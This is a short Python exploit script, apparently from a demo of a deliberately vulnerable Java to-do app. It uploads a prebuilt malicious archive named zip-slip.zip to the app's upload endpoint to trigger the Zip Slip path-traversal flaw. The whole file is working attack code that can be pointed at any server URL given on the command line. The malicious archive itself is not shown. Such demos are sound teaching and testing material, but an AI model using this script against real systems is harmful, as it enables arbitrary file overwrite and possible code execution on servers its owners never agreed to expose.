#! /usr/bin/env python

# to run: `python zip-slip.py http://SERVER-IP:SERVER-PORT`

import requests
import os
import sys

domain = os.getenv("JAVA_GOOF_HOST", "localhost:8080")

malicious_zip = os.path.join(os.path.dirname(__file__), "zip-slip.zip")
url = (
    sys.argv[1] if len(sys.argv) > 1 else f"http://{domain}"
) + "/todo/upload.do.action"
files = {"upload": ("zip-slip.zip", open(malicious_zip, "rb"), "application/zip")}

requests.post(url, files=files)
